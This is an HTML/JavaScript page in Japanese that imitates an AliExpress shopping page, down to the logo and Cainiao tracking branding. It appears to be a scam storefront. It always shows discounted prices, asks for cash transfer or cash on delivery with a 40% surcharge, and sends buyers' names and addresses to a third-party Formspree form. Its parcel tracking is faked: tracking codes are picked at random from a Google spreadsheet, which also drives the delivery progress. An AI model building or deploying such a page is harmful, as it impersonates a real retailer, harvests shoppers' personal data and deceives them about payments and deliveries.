<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AliExpress - お買い物</title>
<style>
:root{--ali-orange:#FF4747;--ali-red:#FD384F;--ali-black:#191919;--bg-gray:#F2F2F7;--cainiao-blue:#0052CC}
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;font-size:11px}
body{background:var(--bg-gray);color:var(--ali-black);max-width:420px;margin:0 auto;min-height:100vh;position:relative;border-left:1px solid #E0E0E0;border-right:1px solid #E0E0E0;box-shadow:0 0 20px rgba(0,0,0,0.05);padding-bottom:60px}

/* アリエク風ヘッダー & 検索バー */
header{background:#FFF;padding:8px 12px;position:sticky;top:0;z-index:90}
.header-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
.logo{font-size:18px;font-weight:900;color:var(--ali-black);font-style:italic;letter-spacing:-0.5px}
.logo span{color:var(--ali-red)}
.coin-badge{background:#FFF8E1;color:#FFA000;border:1px solid #FFE082;padding:2px 8px;border-radius:12px;font-weight:bold;font-size:10px}
.search-bar-wrap{display:flex;align-items:center;background:#F0F0F0;border-radius:20px;padding:4px 6px 4px 12px;border:2px solid var(--ali-black)}
.search-input{border:none;background:none;outline:none;flex:1;font-size:12px;color:#333}
.search-btn{background:var(--ali-black);color:#FFF;border:none;border-radius:50%;width:26px;height:26px;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:12px}

/* カテゴリーアイコン風 */
.cat-nav{display:flex;justify-content:space-between;background:#FFF;padding:8px;margin-bottom:6px}
.cat-item{display:flex;flex-direction:column;align-items:center;gap:4px;flex:1;cursor:pointer}
.cat-icon{font-size:18px;background:#F9F9F9;width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center}
.cat-label{font-size:9px;color:#666;font-weight:bold}

/* 倉庫タブ */
.warehouse-tabs{display:flex;background:#FFF;border-bottom:1px solid #EAEAEA}
.wh-tab{flex:1;text-align:center;padding:10px;font-weight:bold;cursor:pointer;color:#666;border-bottom:3px solid transparent;font-size:12px}
.wh-tab.active{color:var(--ali-red);border-bottom-color:var(--ali-red);font-weight:900}

.container{padding:8px}
.tab-content{display:none}
.tab-content.active{display:block}

/* アリエク風商品グリッド */
.p-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.p-card{background:#FFF;border-radius:12px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,0.04);display:flex;flex-direction:column;justify-content:space-between;padding:8px;border:1px solid #EAEAEA}
.img-box{background:#F4F4F4;height:130px;border-radius:8px;display:flex;justify-content:center;align-items:center;color:#444;font-size:48px;position:relative}
.discount-tag{position:absolute;top:4px;left:4px;background:var(--ali-red);color:#FFF;font-size:9px;font-weight:bold;padding:2px 6px;border-radius:4px}
.p-info{padding:6px 0 0 0;display:flex;flex-direction:column;gap:3px}
.opt-select{width:100%;padding:6px;font-size:11px;margin:4px 0;background:#F6F6F6;border:1px solid #E0E0E0;border-radius:6px;outline:none;color:#333;font-weight:bold}
.price-box{margin-top:2px;display:flex;align-items:baseline;gap:4px;flex-wrap:wrap}
.sale-price{color:var(--ali-red);font-weight:900;font-size:15px}
.original-price{text-decoration:line-through;color:#999;font-size:9px}

.btn-buy{background:linear-gradient(90deg,#FF8800,#FF3300);color:#FFF;border:none;border-radius:18px;padding:7px;cursor:pointer;font-weight:bold;font-size:11px;margin-top:4px;text-align:center;width:100%}

/* パネル */
.panel{background:#FFF;border-radius:12px;padding:12px;margin-top:8px;box-shadow:0 1px 4px rgba(0,0,0,0.04);border:1px solid #EAEAEA}
.f-group{display:flex;flex-direction:column;gap:4px;margin-bottom:8px}
.f-group label{font-weight:bold;color:#444;font-size:11px}
.f-group select, .f-group input{padding:8px;background:#F9F9F9;border:1px solid #DDD;border-radius:6px;outline:none;font-size:11px}

/* 追跡用UI */
.track-card{background:#FFF;border-radius:12px;padding:12px;margin-bottom:10px;box-shadow:0 2px 6px rgba(0,0,0,0.04);border:1px solid #EAEAEA}
.track-header{display:flex;justify-content:space-between;font-weight:bold;margin-bottom:6px;border-bottom:1px solid #F0F0F0;padding-bottom:6px}
.carrier-badge{background:#E8F0FE;color:var(--cainiao-blue);padding:2px 6px;border-radius:4px;font-size:9px;font-weight:bold}
.progress-container{display:flex;justify-content:space-between;margin:12px 4px 22px 4px;position:relative}
.progress-line{position:absolute;top:5px;left:2%;right:2%;height:3px;background:#ECEFF1;z-index:1}
.progress-line-fill{position:absolute;top:5px;left:2%;height:3px;background:#4CAF50;z-index:2;transition:width 0.4s ease}
.progress-dot{width:13px;height:13px;border-radius:50%;background:#FFF;border:3px solid #CFD8DC;z-index:3;display:flex;justify-content:center;align-items:center;position:relative}
.progress-dot.active{border-color:#4CAF50;background:#4CAF50}
.progress-dot span{position:absolute;top:16px;font-size:8px;color:#90A4AE;white-space:nowrap;left:50%;transform:translateX(-50%)}
.progress-dot.active span{color:#2E7D32;font-weight:bold}
.log-box{background:#F7F9FA;border:1px solid #EDF1F2;border-radius:6px;padding:8px;font-size:10px;color:#37474F;max-height:140px;overflow-y:auto;margin-top:10px}

/* ボトムナビゲーションバー */
.bottom-nav{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:420px;background:#FFF;border-top:1px solid #EAEAEA;display:flex;justify-content:space-around;align-items:center;padding:6px 0;z-index:100}
.nav-btn{background:none;border:none;color:#666;display:flex;flex-direction:column;align-items:center;gap:2px;cursor:pointer;flex:1;font-weight:bold;font-size:9px}
.nav-btn .nav-icon{font-size:16px}
.nav-btn.active{color:var(--ali-red)}

#success-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:120;justify-content:center;align-items:center}
.success-box{background:#FFF;border-radius:16px;width:300px;padding:24px;text-align:center}
</style>
</head>
<body>

<div id="success-modal">
<div class="success-box">
<div style="font-size:40px;margin-bottom:10px">📦</div>
<h3 style="font-size:14px;font-weight:900;margin-bottom:6px;color:#2E7D32">注文が完了しました！</h3>
<p style="color:#666;font-size:10px;margin-bottom:12px">注文データはFormspreeへ送信され、ローカルストレージへ保存されました。</p>
<button class="btn-buy" style="width:100%" onclick="closeSuccess()">追跡ページで確認する</button>
</div>
</div>

<header>
<div class="header-top">
<div class="logo">Ali<span>Express</span></div>
<div class="coin-badge">🪙 コインゲット20 ＞</div>
</div>
<div class="search-bar-wrap">
<input type="text" class="search-input" placeholder="クリップファン" value="クリップファン" readonly>
<button class="search-btn">🔍</button>
</div>
</header>

<div class="cat-nav">
<div class="cat-item"><div class="cat-icon">❤️</div><div class="cat-label">おすすめ</div></div>
<div class="cat-item"><div class="cat-icon">📱</div><div class="cat-label">テック</div></div>
<div class="cat-item"><div class="cat-icon">💄</div><div class="cat-label">ホーム＆美容</div></div>
<div class="cat-item"><div class="cat-icon">🐣</div><div class="cat-label">おもちゃ</div></div>
<div class="cat-item"><div class="cat-icon">🏋️</div><div class="cat-label">スポーツ</div></div>
</div>

<div class="warehouse-tabs">
<div id="tab-china" class="wh-tab active" onclick="switchWarehouse('CHINA')">🇨🇳 よりどりセール (海外直送)</div>
<div id="tab-japan" class="wh-tab" onclick="switchWarehouse('JAPAN')">🇯🇵 日本国内発送 (製品心安ストア)</div>
</div>

<div class="container">
<div id="c-shop" class="tab-content active">
<div id="live-loading" style="text-align:center;padding:40px;font-weight:bold;color:#666;">🔄 スプレッドシートから同期中...</div>
<div id="p-grid" class="p-grid" style="display:none;"></div>

<div class="panel">
<h4 style="font-weight:900;margin-bottom:8px;font-size:12px;color:var(--ali-red)">🛒 お支払い手続きカウンター</h4>
<div id="cart-list" style="margin:6px 0;color:#555;line-height:1.5;">カートに商品が入っていません。</div>

<div style="border-top:1px dashed #CFD8DC;padding-top:6px;margin:8px 0;">
<div style="display:flex;justify-content:space-between;font-size:11px;color:#666;">
<span>商品合計:</span><span id="subtotal-val">0円</span>
</div>
<div style="display:flex;justify-content:space-between;font-size:11px;color:#E62E04;font-weight:bold;">
<span>決済手数料 (代引き時40%):</span><span id="fee-val">0円</span>
</div>
<div style="display:flex;justify-content:space-between;font-weight:900;font-size:13px;margin-top:4px;">
<span>総合決済支払い金額:</span><span id="total" style="color:var(--ali-red);font-size:16px">0円</span>
</div>
</div>

<form onsubmit="order(event)" style="display:flex;flex-direction:column;gap:6px">
<div class="f-group">
<label>配送方法</label>
<select><option>標準 (無料 / Cainiao スーパーエコノミー)</option></select>
</div>
<div class="f-group">
<label>お支払い方法の選択</label>
<select id="pay-method" onchange="updateCartPrice()">
<option value="CASH">現金送金 (手数料 0円)</option>
<option value="COD">代金引換 (代引き手数料 40%追加)</option>
</select>
</div>
<input type="text" id="name" required placeholder="受取人氏名（アルファベット氏名）" style="padding:8px">
<input type="text" id="addr" required placeholder="お届け先住所（都道府県・市区町村）" style="padding:8px">
<button type="submit" class="btn-buy" style="padding:10px;font-size:12px;text-transform:uppercase;">安全な決済を行う</button>
</form>
</div>
</div>

<div id="c-my" class="tab-content">
<div id="no-ord" style="text-align:center;padding:40px;color:#999;font-size:12px">🚚 追跡中の注文はありません。</div>
<div id="multi-track-container"></div>
</div>
</div>

<div class="bottom-nav">
<button id="nav-shop" class="nav-btn active" onclick="switchTab('shop')"><div class="nav-icon">🏠</div>ホーム</button>
<button class="nav-btn" onclick="alert('お買い物かご機能')"><div class="nav-icon">🔍</div>お買い物</button>
<button class="nav-btn" onclick="switchWarehouse('JAPAN');switchTab('shop')"><div class="nav-icon">🇯🇵</div>国内発送</button>
<button class="nav-btn" onclick="switchTab('shop')"><div class="nav-icon">🛒</div>カート</button>
<button id="nav-my" class="nav-btn" onclick="switchTab('my')"><div class="nav-icon">👤</div>アカウント(追跡)</button>
</div>

<script>
const SHEET_PROD_URL = "https://docs.google.com/spreadsheets/d/1LK09yYcLi63EW9-xhXIENfszwyFLC4Jmz_-tO69ab94/export?format=csv&gid=0";
const SHEET_TRACK_URL = "https://docs.google.com/spreadsheets/d/178-dcD4xd0fUdEORnoC9haQrKmfGiKTaY0OxiOKBRrQ/export?format=csv&gid=0";
const FORMSPREE_URL = "https://formspree.io/f/xkoezezr";

let products = { CHINA: [], JAPAN: [] }, availableTrackingPool = [], cart = [], orders = [], currentWH = "CHINA";

const SUBJECT_MAP = {
  1: { status: "荷主が荷物をピッキングしています", info: "出荷倉庫にて商品のピッキングが完了しました。" },
  2: { status: "倉庫でのパッキング完了", info: "国際配送用バルクコンテナに格納されました。" },
  3: { status: "国際発送集荷ハブに到着", info: "グローバル中継ハブ施設に入庫処理。" },
  4: { status: "輸出通関手続き完了", info: "輸出税関審査を通過。フライト待ち。" },
  5: { status: "航空会社に引き渡し・フライト待機中", info: "出発便コンテナに積載されました。" },
  6: { status: "原産国を出発", info: "目的国に向けフライトが離陸。" },
  7: { status: "目的地空港に到着・輸入通関開始", info: "日本国内の通関局に到着、審査中。" },
  8: { status: "輸入通関手続き完了（解除）", info: "国内最終デリバリー業者へ委託。" },
  9: { status: "現地物流センターでの仕分け処理中", info: "エリアコード別仕分け完了。" },
  10: { status: "お近くの配達員が貨物を巡回携行中", info: "最寄りの営業所を出発。" },
  11: { status: "配達が正常に完了しました", info: "指定場所へのお届けを完了。" }
};

// 初回起動時にLocalStorageから注文履歴を復元
if (localStorage.getItem('ali_orders')) {
  try { orders = JSON.parse(localStorage.getItem('ali_orders')); } catch(e) { orders = []; }
}

async function loadSpreadsheetData() {
  try {
    const resProd = await fetch(SHEET_PROD_URL);
    const csvProd = await resProd.text();
    const rowsProd = csvProd.split('\n').slice(1);
    products.CHINA = []; products.JAPAN = [];

    rowsProd.forEach((row, idx) => {
      if (!row.trim()) return;
      const cols = row.split(',').map(c => c.replace(/^"(.*)"$/, '$1').trim());
      const warehouse = cols[0] ? cols[0].toUpperCase() : "CHINA";
      const optArray = (cols[5] || "標準").split(/\r?\n/).map(o => o.trim()).filter(Boolean);

      products[warehouse].push({
        id: idx + 1, name: cols[1] || "Global Item", price: parseInt(cols[2]) || 0, icon: cols[4] || "📦",
        opt: optArray.length ? optArray : ["標準"]
      });
    });

    await refreshTrackingPool();
    document.getElementById('live-loading').style.display = 'none';
    document.getElementById('p-grid').style.display = 'grid';
    renderProducts();
  } catch (err) {
    document.getElementById('live-loading').innerText = "スプシ読み込みエラー";
  }
}

async function refreshTrackingPool() {
  try {
    const resTrack = await fetch(SHEET_TRACK_URL + "&t=" + new Date().getTime());
    const csvTrack = await resTrack.text();
    availableTrackingPool = csvTrack.split('\n').slice(1).map(row => {
      if (!row.trim()) return null;
      const cols = row.split(',').map(c => c.replace(/^"(.*)"$/, '$1').trim());
      let stepNum = parseInt(cols[1]);
      return { code: cols[0], step: isNaN(stepNum) ? 1 : stepNum };
    }).filter(Boolean);
  } catch(e){}
}

function switchWarehouse(wh){
  currentWH = wh;
  document.getElementById('tab-china').classList.toggle('active', wh==='CHINA');
  document.getElementById('tab-japan').classList.toggle('active', wh==='JAPAN');
  renderProducts();
}

function switchTab(t){
  document.querySelectorAll('.tab-content').forEach(e=>e.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(e=>e.classList.remove('active'));
  document.getElementById(`c-${t}`).classList.add('active');
  document.getElementById(`nav-${t}`).classList.add('active');
  if(t==='my') renderTrackers();
}

function renderProducts(){
  let fList = products[currentWH] || [];
  document.getElementById('p-grid').innerHTML = fList.map(p=>`
    <div class="p-card">
      <div class="img-box"><div class="discount-tag">58% OFF</div>${p.icon}</div>
      <div class="p-info">
        <div style="font-weight:bold;height:26px;overflow:hidden;line-height:1.2;">${p.name}</div>
        <select id="prod-opt-${p.id}" class="opt-select">${p.opt.map(o=>`<option value="${o}">${o}</option>`).join('')}</select>
        <div class="price-box"><span class="sale-price">${Math.floor(p.price*0.6)}円</span><span class="original-price">${p.price}円</span></div>
        <button class="btn-buy" onclick="addToCart(${p.id})">カートへ追加</button>
      </div>
    </div>`).join('');
}

function addToCart(id){
  let p = products[currentWH].find(x=>x.id===id);
  let optEl = document.getElementById(`prod-opt-${id}`);
  cart.push({...p, chosenOpt: optEl ? optEl.value : "標準", whSource: currentWH});
  updateCartPrice();
}

function updateCartPrice(){
  let list = document.getElementById('cart-list');
  if(!cart.length){
    list.innerHTML = "カートに商品が入っていません。";
    document.getElementById('subtotal-val').textContent = "0円";
    document.getElementById('fee-val').textContent = "0円";
    document.getElementById('total').textContent = "0円";
    return;
  }
  
  list.innerHTML = cart.map((i,idx)=>`
    <div style="display:flex;justify-content:between;margin-bottom:3px;">
      <span>${i.icon} ${i.name} (${i.chosenOpt})</span>
      <span><b>${Math.floor(i.price*0.6)}円</b> <a href="#" onclick="cart.splice(${idx},1);updateCartPrice();return false;" style="color:var(--ali-red);text-decoration:none;margin-left:4px">✕</a></span>
    </div>`).join('');

  let subtotal = cart.reduce((s,i)=> s + Math.floor(i.price*0.6), 0);
  let isCOD = document.getElementById('pay-method').value === "COD";
  let fee = isCOD ? Math.floor(subtotal * 0.4) : 0;
  let finalTotal = subtotal + fee;

  document.getElementById('subtotal-val').textContent = `${subtotal}円`;
  document.getElementById('fee-val').textContent = `${fee}円`;
  document.getElementById('total').textContent = `${finalTotal}円`;
}

function getDeliveryDateStr(daysAdded) {
  let d = new Date(); d.setDate(d.getDate() + daysAdded);
  return `${d.getMonth() + 1}月${d.getDate()}日`;
}

async function order(e){
  e.preventDefault(); if(!cart.length) return;
  await refreshTrackingPool();

  let trackNum = "CN-" + Math.floor(Math.random()*100000000);
  let initialStep = 1;
  if(availableTrackingPool.length > 0) {
    let rand = availableTrackingPool[Math.floor(Math.random() * availableTrackingPool.length)];
    trackNum = rand.code; initialStep = rand.step;
  }

  let subtotal = cart.reduce((s,i)=> s + Math.floor(i.price*0.6), 0);
  let payMethodStr = document.getElementById('pay-method').value === "COD" ? "代金引換(手数料40%)" : "現金送金";
  let finalTotal = document.getElementById('total').textContent;
  let itemsStr = cart.map(c=> `${c.name}(${c.chosenOpt})`).join(', ');

  // 🎯 FormspreeへのPOST送信オブジェクト組み立て
  let formData = new FormData();
  formData.append("追跡番号", trackNum);
  formData.append("注文商品リスト", itemsStr);
  formData.append("お支払い方法", payMethodStr);
  formData.append("合計支払金額", finalTotal);
  formData.append("購入者氏名", document.getElementById('name').value);
  formData.append("配送先住所", document.getElementById('addr').value);

  // Formspreeへバックグラウンド送信
  fetch(FORMSPREE_URL, { method: "POST", body: formData, headers: {'Accept': 'application/json'} });

  let estDelivery = `${getDeliveryDateStr(6)} 〜 ${getDeliveryDateStr(8)}`;
  let targetMap = SUBJECT_MAP[initialStep] || SUBJECT_MAP[1];

  let newOrder = {
    tn: trackNum, itemsSummary: cart.map(c=>`${c.icon}${c.name}`).join(', '), step: initialStep,
    status: `[科目 ${initialStep}/11] ${targetMap.status}`, progress: `${Math.floor((initialStep/11)*100)}%`,
    est: estDelivery, logs: [{ time: new Date().toLocaleTimeString(), msg: targetMap.info }]
  };

  orders.push(newOrder);
  // 🎯 ローカルストレージに即時保存
  localStorage.setItem('ali_orders', JSON.stringify(orders));

  document.getElementById('success-modal').style.display = 'flex';
}

function closeSuccess(){
  document.getElementById('success-modal').style.display = 'none';
  cart = []; updateCartPrice(); switchTab('my'); startLoop();
}

function renderTrackers(){
  let container = document.getElementById('multi-track-container');
  if(!orders.length){ document.getElementById('no-ord').style.display='block'; container.innerHTML=''; return; }
  document.getElementById('no-ord').style.display='none';
  container.innerHTML = orders.map(s=>`
    <div class="track-card">
      <div class="track-header"><b>🚚 トラッキングID: ${s.tn}</b><span class="carrier-badge">Cainiao Global</span></div>
      <div style="font-size:10px;color:#333;background:#FFF3E0;padding:4px;border-radius:4px;margin-bottom:4px">📦 <b>品目:</b> ${s.itemsSummary}</div>
      <div style="color:#2E7D32;font-size:11px;margin-bottom:6px;font-weight:bold;">📅 配達予定日: ${s.est}</div>
      <div style="font-weight:900;color:var(--ali-red);margin:4px 0;font-size:11px;background:#FFEBEE;padding:6px;border-radius:4px">${s.status}</div>
      <div class="progress-container">
        <div class="progress-line"></div><div class="progress-line-fill" style="width:${s.progress}"></div>
        <div class="progress-dot ${s.step>=1?'active':''}"><span>仕分け</span></div>
        <div class="progress-dot ${s.step>=4?'active':''}"><span>発送済</span></div>
        <div class="progress-dot ${s.step>=6?'active':''}"><span>通関審査</span></div>
        <div class="progress-dot ${s.step>=8?'active':''}"><span>国内網</span></div>
        <div class="progress-dot ${s.step>=11?'active':''}"><span>完了</span></div>
      </div>
      <div class="log-box">${s.logs.map(l=>`<div style="margin-bottom:4px;border-bottom:1px dashed #EEE;padding-bottom:2px;"><span style="color:#999;margin-right:4px;">[${l.time}]</span>${l.msg}</div>`).join('')}</div>
    </div>`).join('');
}

let loopTimer = null;
function startLoop(){
  if(loopTimer) return;
  loopTimer = setInterval(async ()=>{
    await refreshTrackingPool();
    let isChanged = false;
    orders.forEach(ord => {
      let match = availableTrackingPool.find(p => p.code === ord.tn);
      if(match && match.step !== ord.step) {
        ord.step = match.step;
        let targetMap = SUBJECT_MAP[ord.step] || SUBJECT_MAP[1];
        ord.status = `[科目 ${ord.step}/11] ${targetMap.status}`;
        ord.progress = `${Math.floor((ord.step/11)*100)}%`;
        ord.logs.unshift({ time: new Date().toLocaleTimeString(), msg: targetMap.info });
        isChanged = true;
      }
    });
    if(isChanged) {
      localStorage.setItem('ali_orders', JSON.stringify(orders));
      renderTrackers();
    }
  }, 2000);
}

loadSpreadsheetData();
startLoop();
</script>
</body>
